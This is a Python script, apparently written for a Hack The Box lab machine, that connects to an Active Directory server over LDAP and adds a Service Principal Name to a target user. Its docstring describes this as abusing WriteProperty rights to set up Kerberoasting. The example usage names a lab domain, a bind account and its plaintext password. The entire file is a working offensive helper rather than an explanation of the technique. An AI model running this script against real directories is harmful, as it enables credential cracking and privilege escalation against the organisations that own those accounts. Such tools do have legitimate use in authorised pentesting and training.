#!/usr/bin/env python3
"""
Example usage:

python3 add_spn.py \
  --ldap-url ldap://10.10.11.72 \
  --bind-dn "CN=henry,CN=Users,DC=tombwatcher,DC=htb" \
  --password 'H3nry_987TGV!' \
  --target-dn "CN=alfred,CN=Users,DC=tombwatcher,DC=htb" \
  --spn "http/fake.tombwatcher.htb"

Description:
  This script adds a Service Principal Name (SPN) to a target Active Directory user object via LDAP.
  Useful for red teamers or pentesters abusing WriteProperty permissions for Kerberoasting.
"""

import argparse
from ldap3 import Server, Connection, MODIFY_ADD, ALL
from ldap3.core.exceptions import LDAPException

def add_spn(ldap_url, bind_dn, password, target_dn, spn):
    try:
        server = Server(ldap_url, get_info=ALL)
        conn = Connection(server, user=bind_dn, password=password, auto_bind=True)

        print(f"[+] Connected to {ldap_url} as {bind_dn}")
        print(f"[+] Attempting to add SPN '{spn}' to {target_dn}...")

        success = conn.modify(
            target_dn,
            {'servicePrincipalName': [(MODIFY_ADD, [spn])]}
        )

        if success:
            print(f"[+] SPN added successfully.")
        else:
            print(f"[-] Failed to add SPN: {conn.result}")

        conn.unbind()

    except LDAPException as e:
        print(f"[!] LDAP error: {e}")

def main():
    parser = argparse.ArgumentParser(description="Add an SPN to a target AD user via LDAP.")
    parser.add_argument('--ldap-url', required=True, help="LDAP server URL (e.g., ldap://10.10.10.10")
    parser.add_argument('--bind-dn', required=True, help="Bind DN (e.g., CN=User,CN=Users,DC=example,DC=com)")
    parser.add_argument('--password', required=True, help="Password for the bind DN")
    parser.add_argument('--target-dn', required=True, help="Distinguished Name of the target user")
    parser.add_argument('--spn', required=True, help="SPN to add (e.g., http/fake.example.local)")

    args = parser.parse_args()

    add_spn(
        ldap_url=args.ldap_url,
        bind_dn=args.bind_dn,
        password=args.password,
        target_dn=args.target_dn,
        spn=args.spn
    )

if __name__ == "__main__":
    main()
